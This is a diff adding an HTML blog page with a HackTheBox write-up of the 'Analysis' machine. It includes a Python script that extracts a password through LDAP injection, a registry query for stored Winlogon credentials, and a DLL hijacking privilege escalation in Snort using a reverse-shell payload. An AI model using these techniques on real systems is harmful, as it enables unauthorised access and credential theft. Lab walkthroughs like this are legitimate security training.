@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Analysis 0090fa0a858243a69b3e23fa77ef57f0 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Analysis 0090fa0a858243a69b3e23fa77ef57f0" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Analysis" />
+<meta property="og:description" content="Analysis" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/10/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/10/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-10T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Analysis 0090fa0a858243a69b3e23fa77ef57f0" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-10T16:05:57+00:00","datePublished":"2025-07-10T16:05:57+00:00","description":"Analysis","headline":"Analysis 0090fa0a858243a69b3e23fa77ef57f0","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/10/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8.html"},"url":"https://your-site-url/writeups/2025/07/10/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Analysis 0090fa0a858243a69b3e23fa77ef57f0</h1>
+  
+  <div class="post-date">
+    Published on 10 Jul 2025
+    
+  </div>
+  
+  <h1 id="analysis">Analysis</h1>
+
+<p>HackTheBox: Hard</p>
+
+<aside>
+💡 A hard windows machine where we can explore a web site looking for ldap injection and dll hijacking.
+
+</aside>
+
+<h2 id="1-enumeration">1: Enumeration</h2>
+
+<ul>
+  <li>nmap scanning</li>
+</ul>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled.png" alt="Untitled" /></p>
+
+<p>We found a http service on 80 port</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_1.png" alt="Untitled" /></p>
+
+<p>Use gobuster to look for any subdomain</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_2.png" alt="Untitled" /></p>
+
+<p>internal subdomain may be interesting</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_3.png" alt="Untitled" /></p>
+
+<p>We use a FUZZ tool for search a directory (Let’s dig into employees)</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_4.png" alt="Untitled" /></p>
+
+<p>We found something interesting</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_5.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_6.png" alt="Untitled" /></p>
+
+<p>it’d be possible to make requests? Let’s see users dir</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_7.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_8.png" alt="Untitled" /></p>
+
+<p>vulnerable to ldpa injection Use a payload</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import argparse
+import requests
+import urllib.parse
+
+def main<span class="o">()</span>:
+    charset_path <span class="o">=</span> <span class="s2">"/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"</span>
+    base_url <span class="o">=</span> <span class="s2">"http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"</span>
+    found_chars <span class="o">=</span> <span class="s2">""</span>
+    skip_count <span class="o">=</span> 6
+    add_star <span class="o">=</span> True
+    with open<span class="o">(</span>charset_path, <span class="s1">'r'</span><span class="o">)</span> as file:
+        <span class="k">for </span>char <span class="k">in </span>file:
+            char <span class="o">=</span> char.strip<span class="o">()</span>
+            <span class="c"># URL encode the character</span>
+            char_encoded <span class="o">=</span> urllib.parse.quote<span class="o">(</span>char<span class="o">)</span>
+            <span class="c"># Check if '*' is found and skip the first 6 '*' characters</span>
+            <span class="k">if</span> <span class="s1">'*'</span> <span class="k">in </span>char and skip_count <span class="o">&gt;</span> 0:
+                skip_count -<span class="o">=</span> 1
+                <span class="k">continue</span>
+            <span class="c"># Add '*' after encountering it for the first time</span>
+            <span class="k">if</span> <span class="s1">'*'</span> <span class="k">in </span>char and add_star:
+                found_chars +<span class="o">=</span> char
+                print<span class="o">(</span>f<span class="s2">"[+] Found Password: {found_chars}"</span><span class="o">)</span>
+                add_star <span class="o">=</span> False
+                <span class="k">continue
+            </span>modified_url <span class="o">=</span> base_url.replace<span class="o">(</span><span class="s2">"{FUZZ}"</span>, char_encoded<span class="o">)</span>.replace<span class="o">(</span><span class="s2">"{found_char}"</span>, found_chars<span class="o">)</span>
+            response <span class="o">=</span> requests.get<span class="o">(</span>modified_url<span class="o">)</span>
+            <span class="k">if</span> <span class="s2">"technician"</span> <span class="k">in </span>response.text and response.status_code <span class="o">==</span> 200:
+                found_chars +<span class="o">=</span> char
+                print<span class="o">(</span>f<span class="s2">"[+] Found Password: {found_chars}"</span><span class="o">)</span>
+                file.seek<span class="o">(</span>0, 0<span class="o">)</span>
+<span class="k">if </span>__name__ <span class="o">==</span> <span class="s2">"__main__"</span>:
+    main<span class="o">()</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Logic</strong>
+    <ol>
+      <li>Base URL definition: The base URL is defined as “[http://internal.analysis.htb/users/list.php?name=<em>](http://internal.analysis.htb/users/list.php?name=</em>))(%26(objectClass=user)(description={found_char}{FUZZ} *)”. This URL includes a placeholder {FUZZ} that will be replaced by each character in the character file and another placeholder {found_char} that will be replaced with the characters found during the fuzzing process.</li>
+      <li>Reading the character file: The character file defined in charset_path is opened and iterated over each line of the file. Each line contains a character that will be used to make requests to the URL.</li>
+      <li>URL Modification: For each character in the character file, the character is encoded and the {FUZZ} placeholder in the base URL is replaced with this encoded character</li>
+      <li>Sending HTTP Requests: An HTTP GET request is sent to the modified URL for each character in the character file.</li>
+      <li><strong>Response verification: It is checked if the response contains the string “technician” and if the response status code is 200 (OK). If both conditions are met, the character is considered part of the password.</strong></li>
+      <li>Update found password: If a character is found that appears to be part of the password, it is added to the variable found_chars, which contains the password found so far.</li>
+      <li>Printing the password found: The password found so far is printed each time a new character is found that appears to be part of the password.</li>
+      <li>Repetition of the process: The process continues until the complete password is found or the entire character set of the file has been scanned.</li>
+    </ol>
+
+    <p>In the code provided there is no explicit logic to determine the order of the characters in the password. The password is out of order due to the fuzzing process being carried out.</p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_9.png" alt="Untitled" /></p>
+
+<h2 id="2-user-flag">2: User flag</h2>
+
+<p>We into log in page we saw before</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_10.png" alt="Untitled" /></p>
+
+<p>Send a php rev shell and get access as svc_web</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_11.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_12.png" alt="Untitled" /></p>
+
+<p>Looking for creds on logon config</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query <span class="s2">"HKEY_LOCAL_MACHINE</span><span class="se">\s</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows NT</span><span class="se">\C</span><span class="s2">urrentversion</span><span class="se">\W</span><span class="s2">inlogon"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_13.png" alt="Untitled" /></p>
+
+<p>Evilwinrm port is open we can try</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_14.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_15.png" alt="Untitled" /></p>
+
+<h2 id="3-priv-esc">3: Priv esc</h2>
+
+<h3 id="privesc-cve-2016-1417">Privesc CVE-2016-1417</h3>
+
+<p>Even when we haven’t the same vulnerability here this one is really similar and the vector attack is almos the same.</p>
+
+<ul>
+  <li>• The vulnerability exists due to an untrusted search path vulnerability. This means the software relies on a search path that can be controlled by an attacker.</li>
+  <li>• Attackers can exploit this by placing a malicious DLL file (e.g., ”tcapi.dll”) in the same directory as a PCAP file being processed by Snort.</li>
+  <li>• When Snort tries to load libraries associated with the PCAP file, it might load the attacker’s malicious DLL instead of the legitimate one, leading to code execution and potential system compromise.</li>
+</ul>
+
+<p>Using linpeas we found there is a possible dll hijacking on</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\S</span>nort<span class="se">\b</span><span class="k">in</span><span class="se">\s</span>nort.exe
+</code></pre></div></div>
+
+<p>Check permissions</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_16.png" alt="Untitled" /></p>
+
+<p>First i tried to using this</p>
+
+<hr />
+
+<ol>
+  <li>Create a evil dll</li>
+</ol>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_17.png" alt="Untitled" /></p>
+
+<ol>
+  <li>set metasploit to receive connection</li>
+</ol>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_18.png" alt="Untitled" /></p>
+
+<ol>
+  <li>Upload evil dll</li>
+</ol>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_19.png" alt="Untitled" /></p>
+
+<p>The problem was i was using a generic payload and it didn’t match with the generated msfvenom payload</p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_20.png" alt="Untitled" /></p>
+
+<hr />
+
+<p>but using default payloads it didn’t work, so after a research i found a better and easy one:</p>
+
+<ol>
+  <li>Make a evil dll</li>
+</ol>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_21.png" alt="Untitled" /></p>
+
+<ol>
+  <li>Use metasploit to get connection</li>
+</ol>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_22.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_23.png" alt="Untitled" /></p>
+
+<ol>
+  <li>Upload the evil dll</li>
+</ol>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_24.png" alt="Untitled" /></p>
+
+<ol>
+  <li>Machine pwned!!!</li>
+</ol>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
+
+<p><a href="https://www.notion.so">https://www.notion.so</a></p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/10/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8.html';
+     this.page.identifier = '/writeups/2025/07/10/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8';
+     this.page.title = 'Analysis 0090fa0a858243a69b3e23fa77ef57f0';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
